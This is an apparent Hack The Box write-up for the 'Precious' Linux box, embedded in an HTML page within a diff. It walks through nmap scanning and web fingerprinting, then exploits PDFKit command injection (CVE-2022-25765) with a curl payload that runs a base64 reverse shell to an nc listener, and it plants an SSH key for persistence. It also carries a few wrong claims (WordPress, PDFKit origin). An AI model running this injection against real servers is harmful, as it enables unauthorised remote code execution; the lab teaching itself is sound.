@@ -1,0 +1,858 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    
+        <meta name="author" content="Matthieu Mezirard">
+    
+    <meta name="author" content="Matthieu Mezirard" />
+    
+        <meta name="description" content="This is an easy Linux box.">
+    
+    <title>
+        
+            
+        
+        root@mmezirard:~&#x2F;htb-write-ups&#x2F;boxes&#x2F;precious#
+    </title>
+    <link rel="icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="stylesheet" type="text/css" href="/main.css" />
+    <link
+        id="theme-light-style"
+        rel="stylesheet"
+        type="text/css"
+        href="/theme/light.css"
+    />
+    <link
+        id="theme-dark-style"
+        rel="stylesheet"
+        type="text/css"
+        href="/theme/dark.css"
+    />
+    <script
+        async
+        src="https://eu.umami.is/script.js"
+        data-website-id="ab1b120c-cc97-47d0-bddb-d1a96cb06e5a"
+    ></script>
+    <script src="/js/theme-toggle.js"></script>
+    <script src="/js/code-wrapper.js"></script>
+    <script src="/js/code-indicator.js"></script>
+</head>
+
+
+    <body>
+        <header>
+    <div class="left">
+        <a href="/">
+    mmezirard
+</a>
+
+        <div class="socials">
+    
+        <a class="social" href="https:&#x2F;&#x2F;github.com&#x2F;mmezirard&#x2F;">
+            <img src="/icons/github.svg" alt="github" />
+        </a>
+    
+        <a class="social" href="https:&#x2F;&#x2F;app.hackthebox.com&#x2F;users&#x2F;1301891&#x2F;">
+            <img src="/icons/hack-the-box.svg" alt="hack-the-box" />
+        </a>
+    
+        <a class="social" href="https:&#x2F;&#x2F;hackerone.com&#x2F;mmezirard&#x2F;">
+            <img src="/icons/hackerone.svg" alt="hackerone" />
+        </a>
+    
+</div>
+
+    </div>
+    <div class="right">
+        <nav>
+    <ul>
+        
+            <li>
+                <a href="&#x2F;htb-write-ups">
+                    &#x2F;htb-write-ups
+                </a>
+            </li>
+        
+    </ul>
+</nav>
+
+        <button onclick="toggleTheme()">
+    <img id="theme-toggle-sun" src="/icons/sun.svg" alt="Sun" />
+    <img id="theme-toggle-moon" src="/icons/moon.svg" alt="Moon" />
+</button>
+<script src="/js/theme-toggle.js"></script>
+
+    </div>
+</header>
+
+        
+    <main>
+        
+<article>
+    <div>
+        
+    
+        <div class="page-h1">
+            Precious<span>.</span>
+        </div>
+    
+
+
+        <div class="page-metadata">
+            
+                Posted on <time>2023-02-20</time>
+            
+        </div>
+
+        
+            <img
+                class="page-cover"
+                alt="cover.png"
+                src="https://mmezirard.github.io/htb-write-ups/boxes/precious/cover.png"
+            />
+        
+    </div>
+
+    
+        <h1>Table of Contents</h1>
+        <ul>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/precious/#information">Information</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/precious/#setup">Setup</a>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/precious/#host-10-10-11-189">Host 10.10.11.189</a>
+                    
+                        <ul>
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/precious/#scanning">Scanning</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/precious/#ports">Ports</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/precious/#fingerprinting">Fingerprinting</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/precious/#scripts">Scripts</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/precious/#services-enumeration">Services enumeration</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/precious/#nginx">Nginx</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/precious/#foothold-cve-2022-25765">Foothold (CVE-2022-25765)</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/precious/#preparation">Preparation</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/precious/#exploitation">Exploitation</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/precious/#spawning-a-pty-establishing-persistence">Spawning a pty &amp; establishing persistence</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/precious/#getting-a-lay-of-the-land">Getting a lay of the land</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/precious/#architecture">Architecture</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/precious/#distribution">Distribution</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/precious/#kernel">Kernel</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/precious/#users">Users</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/precious/#groups">Groups</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/precious/#nics">NICs</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/precious/#hostname">Hostname</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/precious/#system-enumeration">System enumeration</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/precious/#website-code-review">Website code review</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/precious/#home-folders">Home folders</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/precious/#lateral-movement-ssh">Lateral movement (SSH)</a>
+                                </li>
+
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/precious/#system-enumeration-1">System enumeration</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/precious/#flags">Flags</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/precious/#sudo-permissions">Sudo permissions</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/precious/#inspecting-opt-update-dependencies-rb">Inspecting &#x2F;opt&#x2F;update_dependencies.rb</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/precious/#privilege-escalation-ruby-deserialization">Privilege escalation (Ruby deserialization)</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/precious/#preparation-1">Preparation</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/precious/#exploitation-1">Exploitation</a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/precious/#establishing-persistence">Establishing persistence</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                                <li>
+                                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/precious/#system-enumeration-2">System enumeration</a>
+                                </li>
+
+                                
+                                    <ul>
+                                        
+                                            <li>
+                                                <a href="https://mmezirard.github.io/htb-write-ups/boxes/precious/#flags-1">Flags</a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            
+                        </ul>
+                    
+                </li>
+            
+                <li>
+                    <a href="https://mmezirard.github.io/htb-write-ups/boxes/precious/#afterwords">Afterwords</a>
+                    
+                </li>
+            
+        </ul>
+    
+
+    <section><h1 id="information">Information</h1>
+<p><strong>Difficulty</strong>: Easy</p>
+<p><strong>OS</strong>: Linux</p>
+<p><strong>Release date</strong>: 2022-11-26</p>
+<p><strong>Created by</strong>: <a href="https://app.hackthebox.com/users/27582">Nauten</a></p>
+<h1 id="setup">Setup</h1>
+<p>I'll attack this box from a Kali Linux VM as the <code>root</code> user — not a great
+practice security-wise, but it's a VM so it's alright. This way I won't have to
+prefix some commands with <code>sudo</code>, which gets cumbersome in the long run.</p>
+<p>I like to maintain consistency in my workflow for every box, so before starting
+with the actual pentest, I'll prepare a few things:</p>
+<ol>
+<li>
+<p>I'll create a directory that will contain every file related to this box.
+I'll call it <code>workspace</code>, and it will be located at the root of my filesystem
+<code>/</code>.</p>
+</li>
+<li>
+<p>I'll create a <code>server</code> directory in <code>/workspace</code>. Then, I'll use
+<code>httpsimpleserver</code> to create an HTTP server on port <code>80</code> and
+<code>impacket-smbserver</code> to create an SMB share named <code>server</code>. This will make
+files in this folder available over the Internet, which will be especially
+useful for transferring files to the target machine if need be!</p>
+</li>
+<li>
+<p>I'll place all my tools and binaries into the <code>/workspace/server</code> directory.
+This will come in handy once we get a foothold, for privilege escalation and
+for pivoting inside the internal network.</p>
+</li>
+</ol>
+<p>I'll also strive to minimize the use of Metasploit, because it hides the
+complexity of some exploits, and prefer a more manual approach when it's not too
+much hassle. This way, I'll have a better understanding of the exploits I'm
+running, and I'll have more control over what's happening on the machine.</p>
+<p>Throughout this write-up, my machine's IP address will be <code>10.10.14.5</code>. The
+commands ran on my machine will be prefixed with <code>❯</code> for clarity, and if I ever
+need to transfer files or binaries to the target machine, I'll always place them
+in the <code>/tmp</code> or <code>C:\tmp</code> folder to clean up more easily later on.</p>
+<p>Now we should be ready to go!</p>
+<h1 id="host-10-10-11-189">Host <code>10.10.11.189</code></h1>
+<h2 id="scanning">Scanning</h2>
+<h3 id="ports">Ports</h3>
+<p>As usual, let's start by initiating a port scan on Precious using a TCP SYN
+<code>nmap</code> scan to assess its attack surface.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.11.189<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p-</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT   STATE SERVICE
+</span><span class="z-text z-plain">22/tcp open  ssh
+</span><span class="z-text z-plain">80/tcp open  http
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Let's also check the 500 most common UDP ports.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sU</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.11.189<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> --</span>top-ports</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>500<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT   STATE         SERVICE
+</span><span class="z-text z-plain">68/udp open|filtered dhcpc
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<h3 id="fingerprinting">Fingerprinting</h3>
+<p>Following the ports scans, let's gather more data about the services associated
+with the open TCP ports we found.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.11.189<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>22,80<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sV</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT   STATE SERVICE VERSION
+</span><span class="z-text z-plain">22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+</span><span class="z-text z-plain">80/tcp open  http    nginx 1.18.0
+</span><span class="z-text z-plain">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Let's do the same for the UDP port.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sU</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.11.189<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>68<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sV</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT   STATE         SERVICE VERSION
+</span><span class="z-text z-plain">68/udp open|filtered dhcpc
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Alright, so <code>nmap</code> managed to determine that Precious is running Linux, and the
+version of SSH suggests that it might be Debian.</p>
+<h3 id="scripts">Scripts</h3>
+<p>Let's run <code>nmap</code>'s default scripts on the TCP services to see if they can find
+additional information.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.11.189<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>22,80<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sC</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT   STATE SERVICE
+</span><span class="z-text z-plain">22/tcp open  ssh
+</span><span class="z-text z-plain">| ssh-hostkey: 
+</span><span class="z-text z-plain">|   3072 84:5e:13:a8:e3:1e:20:66:1d:23:55:50:f6:30:47:d2 (RSA)
+</span><span class="z-text z-plain">|   256 a2:ef:7b:96:65:ce:41:61:c4:67:ee:4e:96:c7:c8:92 (ECDSA)
+</span><span class="z-text z-plain">|_  256 33:05:3d:cd:7a:b7:98:45:82:39:e7:ae:3c:91:a6:58 (ED25519)
+</span><span class="z-text z-plain">80/tcp open  http
+</span><span class="z-text z-plain">|_http-title: Did not follow redirect to http://precious.htb/
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Let's also run them on the UDP service.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sU</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.11.189<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>68<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sC</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT   STATE         SERVICE
+</span><span class="z-text z-plain">68/udp open|filtered dhcpc
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>The <code>http-title</code> script indicates that the Nginx server redirects to
+<code>http://precious.htb/</code>. I'll add it to my <code>/etc/hosts</code> file.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> echo <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.11.189 precious.htb<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;&gt;</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/etc/hosts<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<p>Now I'll run <code>nmap</code>'s default scripts on the web server once again.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> nmap<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sS</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>precious.htb<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>80<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>sC</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">PORT   STATE SERVICE
+</span><span class="z-text z-plain">80/tcp open  http
+</span><span class="z-text z-plain">|_http-title: Convert Web Page to PDF
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>The <code>http_generator</code> script leaks that WordPress version <code>4.8</code> is used to
+generate the website.</p>
+<h2 id="services-enumeration">Services enumeration</h2>
+<h3 id="nginx">Nginx</h3>
+<h4 id="exploration">Exploration</h4>
+<p>Let's browse to <code>http://precious.htb/</code>.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/precious/domain-homepage.png" alt="Domain homepage" /></p>
+<p>It's a website to convert a web page to a PDF.</p>
+<h4 id="fingerprinting-1">Fingerprinting</h4>
+<p>Let's fingerprint the technologies used by this web page with the
+<a href="https://www.wappalyzer.com/">Wappalyzer</a> extension.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/precious/domain-homepage-wappalyzer.png" alt="Domain homepage Wappalyzer extension" /></p>
+<p>This reveals that this web page is using Phusion Passenger®. What's that?</p>
+<blockquote>
+<p>Phusion Passenger® is a web server and application server, designed to be
+fast, robust and lightweight. It takes a lot of complexity out of deploying
+web apps, adds powerful enterprise-grade features that are useful in
+production, and makes administration much easier and less complex.</p>
+<p>— <a href="https://github.com/phusion/passenger">GitHub</a></p>
+</blockquote>
+<p>If we check the HTTP headers of the response, we also find a <code>X-Runtime</code> header
+suggesting that the server is using Ruby on Rails.</p>
+<h4 id="exploration-1">Exploration</h4>
+<p>We can enter a URL to fetch. I'll start by entering a random URL.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/precious/domain-homepage-invalid-url.png" alt="Domain homepage invalid url" /></p>
+<p>It detects that the URL is invalid. But what if I enter a URL that doesn't
+exist?</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/precious/domain-homepage-fake-url.png" alt="Domain homepage fake url" /></p>
+<p>After a while, we get a message saying that it failed to load the web page.</p>
+<p>If I enter a valid URL, it works great.</p>
+<h4 id="under-the-hood">Under the hood</h4>
+<p>If we check the previous requests using Burp Suite, we notice that when we press
+the 'Submit' button to submit the form, a POST message is sent to <code>/</code> with the
+data:</p>
+<pre data-lang="html" class="language-html z-code"><code class="language-html" data-lang="html"><span class="z-text z-html z-basic">url=<span class="z-meta z-tag z-other z-html"><span class="z-punctuation z-definition z-tag z-begin z-html">&lt;</span></span><span class="z-meta z-tag z-other z-html"><span class="z-entity z-name z-tag z-other z-html">URL</span><span class="z-punctuation z-definition z-tag z-end z-html">&gt;</span></span>
+</span></code></pre>
+<p>If we check the response for a request containing a valid URL, we see that it's
+mostly gibberish. However, we find a line indicating that this PDF was has been
+generated using PDFKit version <code>0.8.6</code>.</p>
+<blockquote>
+<p>PDFKit is a PDF document generation library for Node and the browser that
+makes creating complex, multi-page, printable documents easy. The API embraces
+chainability, and includes both low level functions as well as abstractions
+for higher level functionality. The PDFKit API is designed to be simple, so
+generating complex documents is often as simple as a few function calls.</p>
+<p>— <a href="https://github.com/foliojs/pdfkit">GitHub</a></p>
+</blockquote>
+<p>Note that if we use <code>exiftool</code> on the PDF we obtained by entering a valid URL,
+we get the same information:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> exiftool <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/workspace/generated_pdf.pdf<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">Creator                         : Generated by pdfkit v0.8.6
+</span></code></pre>
+<h4 id="known-vulnerabilities">Known vulnerabilities</h4>
+<p>If we search <a href="https://www.exploit-db.com/">ExploitDB</a> for <code>PDFKit</code>, we find
+<a href="https://www.exploit-db.com/exploits/51293">pdfkit v0.8.7.2 - Command Injection</a>
+(<a href="https://nvd.nist.gov/vuln/detail/CVE-2022-25765">CVE-2022-25765</a>).</p>
+<h2 id="foothold-cve-2022-25765">Foothold (<a href="https://nvd.nist.gov/vuln/detail/CVE-2022-25765">CVE-2022-25765</a>)</h2>
+<p><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-25765">CVE-2022-25765</a> is a
+vulnerability affecting PDFKit versions prior to <code>0.8.7.2</code>. Due to improper user
+input sanitization, an attacker can craft a special URL to get RCE.</p>
+<h3 id="preparation">Preparation</h3>
+<p>The goal is to exploit this RCE to obtain a reverse shell.</p>
+<p>First, I'll setup a listener to receive the shell.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> rlwrap nc<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>lvnp</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>9001<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<p>Then, I'll choose the Base64 encoded version of the 'Bash -i' payload from
+<a href="https://www.revshells.com/">RevShells</a> configured to obtain a <code>/bin/bash</code>
+shell.</p>
+<p>I'll save it as the <code>BASE64_REVSHELL_PAYLOAD</code> shell variable.</p>
+<h3 id="exploitation">Exploitation</h3>
+<p>Let's exploit the PDFKit vulnerability to execute our payload.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> curl<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>s</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>o</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>/dev/null<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>http://precious.htb/<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>X</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>POST<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>d</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>url=http%3A%2F%2F%2520%60%2Fbin%2Fecho%20<span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">BASE64_REVSHELL_PAYLOAD</span></span>%20%7C%20%2Fusr%2Fbin%2Fbase64%20-d%20%7C%20%2Fbin%2Fbash%20-i%60<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span>
+</span></code></pre>
+<p>If we check our listener:</p>
+<pre class="z-code"><code><span class="z-text z-plain">connect to [10.10.14.5] from (UNKNOWN) [10.10.11.189] 42088
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">ruby@precious:/var/www/pdfapp$
+</span></code></pre>
+<p>It caught the reverse shell!</p>
+<h3 id="spawning-a-pty-establishing-persistence">Spawning a pty &amp; establishing persistence</h3>
+<p>Let's use SSH to spawn a pty and to establish persistence.</p>
+<p>Our home folder doesn't contain a <code>.ssh</code> folder, so I'll create one. Then I'll
+create a private key, and I'll add the corresponding public key to
+<code>authorized_keys</code>. Finally, I'll connect over SSH to Precious as <code>ruby</code>.</p>
+<h2 id="getting-a-lay-of-the-land">Getting a lay of the land</h2>
+<p>If we run <code>whoami</code>, we see that we got a foothold as <code>ruby</code>.</p>
+<h3 id="architecture">Architecture</h3>
+<p>What is Precious's architecture?</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">ruby@precious:<span class="z-meta z-group z-expansion z-tilde"><span class="z-variable z-language z-tilde z-shell">~</span></span>$</span></span><span class="z-meta z-function-call z-arguments z-shell"> uname<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>m</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">x86_64
+</span></code></pre>
+<p>It's using x86_64. Let's keep that in mind to select the appropriate binaries.</p>
